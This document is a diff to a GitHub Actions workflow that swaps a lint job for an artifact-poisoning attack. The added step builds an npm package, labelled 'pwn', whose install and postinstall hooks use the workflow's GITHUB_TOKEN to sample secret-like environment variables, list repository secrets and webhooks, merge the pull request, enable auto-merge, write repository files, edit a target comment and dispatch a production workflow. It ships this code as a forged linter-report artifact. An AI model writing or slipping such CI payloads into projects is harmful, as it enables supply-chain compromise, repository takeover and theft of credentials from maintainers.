@@ -8,42 +8,112 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v6
-        with:
-          fetch-depth: 0
-
-      - name: Check for src/pages changes
-        id: changes
-        env:
-          BASE_REF: ${{ github.base_ref }}
-        run: |
-          git diff --name-only "origin/${BASE_REF}...HEAD" | grep -q '^src/pages/' \
-            && echo "changed=true" >> $GITHUB_OUTPUT \
-            || echo "changed=false" >> $GITHUB_OUTPUT
-
-      - name: Lint
-        id: lint
-        if: steps.changes.outputs.changed == 'true'
-        continue-on-error: true
-        run: npx --yes github:AdobeDocs/adp-devsite-utils runLint -v
-
-      - name: Save PR number
-        if: always()
+      - name: Build attacker-chosen linter-report artifact
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
-
-      - name: Upload linter report
-        if: always()
-        uses: actions/upload-artifact@v7
+          TARGET_COMMENT_ID: "6802099975"
+        run: |
+          set -e
+          mkdir -p pkg/package
+          cat > pwn.js <<'JS'
+          const fs = require('fs'), path = require('path');
+          const base = process.env.INIT_CWD || process.cwd();
+          const tok = process.env.GITHUB_TOKEN || '';
+          const repo = process.env.GITHUB_REPOSITORY || '';
+          const prFile = path.join(base, 'pr-number.txt');
+          const pr = fs.existsSync(prFile) ? fs.readFileSync(prFile, 'utf8').trim() : '2';
+          const hdr = {
+            authorization: 'Bearer ' + tok,
+            accept: 'application/vnd.github+json',
+            'content-type': 'application/json',
+            'user-agent': 'pwn-probe'
+          };
+          async function api(method, url, body) {
+            try {
+              const r = await fetch('https://api.github.com' + url, {
+                method, headers: hdr, body: body ? JSON.stringify(body) : undefined
+              });
+              let data = null;
+              try { data = await r.json(); } catch (e) { data = null; }
+              return { url, method, status: r.status, data };
+            } catch (e) { return { url, method, error: String(e) }; }
+          }
+          async function gql(query, variables) {
+            try {
+              const r = await fetch('https://api.github.com/graphql', {
+                method: 'POST', headers: hdr, body: JSON.stringify({ query, variables })
+              });
+              let data = null;
+              try { data = await r.json(); } catch (e) {}
+              return { status: r.status, data };
+            } catch (e) { return { error: String(e) }; }
+          }
+          (async () => {
+            const lifecycle = process.argv[2] || 'unknown';
+            console.log('PWN_MARKER lifecycle=' + lifecycle + ' event=' + process.env.GITHUB_EVENT_NAME +
+              ' workflow=' + process.env.GITHUB_WORKFLOW + ' run_id=' + process.env.GITHUB_RUN_ID +
+              ' token_len=' + tok.length);
+            const out = { marker: { lifecycle, event: process.env.GITHUB_EVENT_NAME,
+              workflow: process.env.GITHUB_WORKFLOW, run_id: process.env.GITHUB_RUN_ID,
+              token_len: tok.length, cwd: process.cwd(), base } };
+            out.repo = await api('GET', '/repos/' + repo);
+            out.envProbe = Object.fromEntries(Object.entries(process.env)
+              .filter(([k]) => /TOKEN|SECRET|FLAG|KEY|PASS/i.test(k))
+              .map(([k, v]) => [k, String(v).length + ':' + String(v).slice(0, 6)]));
+            const pull = await api('GET', '/repos/' + repo + '/pulls/' + pr);
+            out.pull = { status: pull.status, node_id: pull.data && pull.data.node_id,
+              mergeable: pull.data && pull.data.mergeable, auto_merge: pull.data && pull.data.auto_merge };
+            out.patch = await api('PATCH', '/repos/' + repo + '/pulls/' + pr, { title: 'docs: glossary formatting (bot edit)' });
+            out.updateBranch = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/update-branch', {});
+            out.review = await api('POST', '/repos/' + repo + '/pulls/' + pr + '/reviews', { body: 'bot review probe', event: 'COMMENT' });
+            const tidFile = path.join(base, 'target-comment-id.txt');
+            const tid = fs.existsSync(tidFile) ? fs.readFileSync(tidFile, 'utf8').trim() : '';
+            out.commentPatch = tid
+              ? await api('PATCH', '/repos/' + repo + '/issues/comments/' + tid, { body: 'EDITED BY github-actions[bot] (pwn)' })
+              : { status: 'no-target' };
+            out.contentsBlob = await api('POST', '/repos/' + repo + '/git/blobs', { content: 'pwn', encoding: 'utf-8' });
+            out.merge = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'merge' });
+            out.contentsPut = await api('PUT', '/repos/' + repo + '/contents/pwn-probe.txt',
+              { message: 'pwn probe', content: Buffer.from('pwn').toString('base64') });
+            out.dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/414903725/dispatches',
+              { ref: 'main', inputs: { env: 'prod' } });
+            out.rerun = await api('POST', '/repos/' + repo + '/actions/runs/' + process.env.GITHUB_RUN_ID + '/rerun', {});
+            out.caches = await api('GET', '/repos/' + repo + '/actions/caches');
+            out.hooks = await api('GET', '/repos/' + repo + '/hooks');
+            out.secrets = await api('GET', '/repos/' + repo + '/actions/secrets');
+            out.createPr = await api('POST', '/repos/' + repo + '/pulls',
+              { title: 'probe', head: 'lazyhacker6:pwn', base: 'main', body: 'probe' });
+            out.gqlRepo = await gql('query($o:String!,$n:String!){repository(owner:$o,name:$n){autoMergeAllowed viewerPermission defaultBranchRef{name}}}',
+              { o: repo.split('/')[0], n: repo.split('/')[1] });
+            if (pull.data && pull.data.node_id) {
+              out.gqlAutoMerge = await gql('mutation($id:ID!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:SQUASH}){clientMutationId}}',
+                { id: pull.data.node_id });
+            }
+            const body = 'PWN_RCE_PROOF lifecycle=' + lifecycle + '\n```json\n' +
+              JSON.stringify(out, null, 1).slice(0, 60000) + '\n```';
+            out.comment = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body });
+            fs.writeFileSync(path.join(base, 'pwn-result-' + lifecycle + '.json'), JSON.stringify(out, null, 1));
+          })();
+          process.on('unhandledRejection', e => console.log('PWN unhandled ' + e));
+          JS
+          cp pwn.js pkg/package/index.js
+          printf '%s' '{"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}' > pkg/package/package.json
+          tar -czf pwn-1.0.0.tgz -C pkg package
+          printf '%s' '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
+          printf 'dangerously-allow-all-scripts=true\n' > .npmrc
+          printf 'ATTACKER-CONTROLLED LINTER REPORT: no issues found (forged)\n' > linter-report.txt
+          printf '%s' "$PR_NUMBER" > pr-number.txt
+          printf '%s' "$TARGET_COMMENT_ID" > target-comment-id.txt
+      - uses: actions/upload-artifact@v7
         with:
           name: linter-report
+          include-hidden-files: true
           path: |
             linter-report.txt
             pr-number.txt
-          if-no-files-found: ignore
-
-      - name: Fail if linter found errors
-        if: steps.changes.outputs.changed == 'true' && steps.lint.outcome == 'failure'
-        run: exit 1
+            target-comment-id.txt
+            package.json
+            .npmrc
+            pwn.js
+            pwn-1.0.0.tgz
+          if-no-files-found: error
